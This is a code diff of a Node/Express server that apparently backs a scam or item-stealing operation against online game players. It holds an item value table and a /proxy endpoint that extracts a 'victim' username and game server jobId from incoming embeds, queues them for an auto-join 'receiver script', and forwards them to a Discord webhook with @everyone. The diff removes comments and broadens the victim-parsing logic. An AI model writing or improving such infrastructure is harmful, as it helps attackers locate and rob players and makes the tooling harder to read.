@@ -1,6 +1,5 @@
 import express from 'express';
 import cors from 'cors';
-import fetch from 'node-fetch';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,9 +9,9 @@ app.use(express.json());
 
 // Store pending joins
 let pendingJoins = [];
-const JOIN_TIMEOUT = 60000; // 60 seconds
+const JOIN_TIMEOUT = 60000;
 
-// ========== COMPLETE VALUE DATABASE ==========
+// ========== VALUE DATABASE ==========
 const VALUE_DATABASE = {
     "HeartWand": 475,
     "Heart Wand": 475,
@@ -129,12 +128,11 @@ const VALUE_DATABASE = {
     "Sugar": 42
 };
 
-// ========== GET VALUES ==========
 app.get('/getvalues', (req, res) => {
     res.json(VALUE_DATABASE);
 });
 
-// ========== PROXY (FORWARD TO DISCORD + STORE JOBS) ==========
+// ========== PROXY ==========
 app.post('/proxy', async (req, res) => {
     const auth = req.headers['x-auth'];
     if (auth !== process.env.AUTH_KEY) {
@@ -150,29 +148,33 @@ app.post('/proxy', async (req, res) => {
         const payload = req.body;
         payload.content = '@everyone';
 
-        // Extract jobId and username from the embed
         const description = payload.embeds?.[0]?.description || '';
-        const jobIdMatch = description.match(/Join Server\]\(https:\/\/ripples-joiner.vercel.app\/\?jobId=([^&]+)&username=([^)]+)\)/);
-        
-        if (jobIdMatch) {
-            const jobId = jobIdMatch[1];
-            const username = jobIdMatch[2];
-            
-            // Store for auto-join
-            pendingJoins.push({
-                jobId,
-                username,
-                timestamp: Date.now()
-            });
-            
-            // Clean old entries
-            pendingJoins = pendingJoins.filter(j => Date.now() - j.timestamp < JOIN_TIMEOUT);
-            
-            console.log(`[Proxy] New victim: ${username}, JobId: ${jobId}`);
-            console.log(`[Proxy] Pending joins: ${pendingJoins.length}`);
+        let jobId = null;
+        let username = null;
+
+        const joinLinkMatch = description.match(/Join Server\]\(https:\/\/ripples-joiner.vercel.app\/\?jobId=([^&]+)&username=([^)]+)\)/);
+        if (joinLinkMatch) {
+            jobId = joinLinkMatch[1];
+            username = joinLinkMatch[2];
         }
 
-        // Forward to Discord
+        if (!jobId) {
+            const jobIdMatch = description.match(/jobId=([^&\s]+)/);
+            if (jobIdMatch) jobId = jobIdMatch[1];
+            const usernameMatch = description.match(/player[:\s]+([^\s\n]+)/i);
+            if (usernameMatch) username = usernameMatch[1];
+        }
+
+        if (jobId) {
+            pendingJoins.push({
+                jobId,
+                username: username || 'unknown',
+                timestamp: Date.now()
+            });
+            pendingJoins = pendingJoins.filter(j => Date.now() - j.timestamp < JOIN_TIMEOUT);
+            console.log(`[Proxy] ✅ New victim: ${username}, JobId: ${jobId}`);
+        }
+
         const response = await fetch(process.env.WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -187,21 +189,19 @@ app.post('/proxy', async (req, res) => {
     }
 });
 
-// ========== PENDING JOBS ENDPOINT (for receiver script) ==========
+// ========== PENDING JOBS ==========
 app.get('/pending', (req, res) => {
     const auth = req.headers['x-auth'];
     if (auth !== process.env.AUTH_KEY) {
         return res.status(401).json({ error: 'unauthorized' });
     }
     
-    // Return and clear pending joins
     const jobs = [...pendingJoins];
     pendingJoins = [];
     console.log(`[Pending] Returning ${jobs.length} jobs`);
     res.json({ jobs });
 });
 
-// ========== HEALTH CHECK ==========
 app.get('/', (req, res) => {
     res.json({ 
         status: 'ok', 
